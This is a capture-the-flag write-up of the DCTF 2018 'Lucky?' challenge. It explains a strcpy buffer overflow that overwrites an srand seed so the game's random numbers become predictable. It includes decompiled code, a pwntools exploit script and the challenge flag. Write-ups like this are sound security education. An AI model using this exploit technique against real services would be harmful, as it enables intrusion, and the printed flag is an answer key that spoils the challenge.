# **Lucky?**

#### tag : pwn, bof, random

-----------------------------------------------

#### Description

>How lucky are you?

>Target: 167.99.143.206 65031

>Bin: https://dctf.def.camp/dctf-18-quals-81249812/lucky

-----------------------------------------------

#### Solution

I can find there is input string will overwrite `&dest` by `strcpy` so that there is bof vulnerability in binary. But because this binary is secured by `PIE`, there is no use of overwriting ret address.

~~~

LODWORD(v9) = std::operator<<<std::char_traits<char>>(&std::cout, "What is your name?");
std::ostream::operator<<(v9, &std::endl<char,std::char_traits<char>>);
std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, &v27);
LODWORD(v10) = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(&v27);
strcpy(&dest, v10);
srand(v35);

~~~

Well, I can focus `v35` which is random seed in question. `v35` can be overwrited by inputting name.

~~~

char dest; // [sp+260h] [bp-2E0h]@7
char v29; // [sp+2D0h] [bp-270h]@7
char v30; // [sp+2F0h] [bp-250h]@1
__int64 v31; // [sp+3F0h] [bp-150h]@1
unsigned int seed[2]; // [sp+4F8h] [bp-48h]@1
int v33; // [sp+514h] [bp-2Ch]@9
int v34; // [sp+518h] [bp-28h]@9
unsigned int v35; // [sp+51Ch] [bp-24h]@7

~~~

I make `random.c` to get rand number for fixed seed. I set seed to `0x61616161`. And I can get `randmal` which is result of rand.

Here is my solution.

```python

#!/usr/bin/env python
from pwn import *

### DEBUGGGING ###

DEBUG = True

if DEBUG:
    r = process('lucky')
    timeout = 0.1

#    gdb.attach(r,'''
#    b main
#    ''')
    context.log_level = 'debug'

else:
    r = remote('',0)
    timeout = 0.3

def ss(s):
    sleep(timeout)
    return r.sendline(s)

def rr(s):
    sleep(timeout)
    return r.recvuntil(s)

### ADDRESS ###
### PAYLOAD ###

rd = (open('randmal', 'r').read()).split('\n')[:-1]
offset = 0x2e0

### EXPLOIT ###

def main():
    rr('?\n')
    ss('a' * offset)

    for i in range(0,100):
        rr(']\n')
        ss(rd[i])

    r.interactive()

if __name__ == '__main__':
    try:
        main()
    except:
        log.info('exception occur')


```

**DCTF{8adadb46b599a58344559e009bc167da7f0e65e64167c27d3192e8b6df073eaa}**
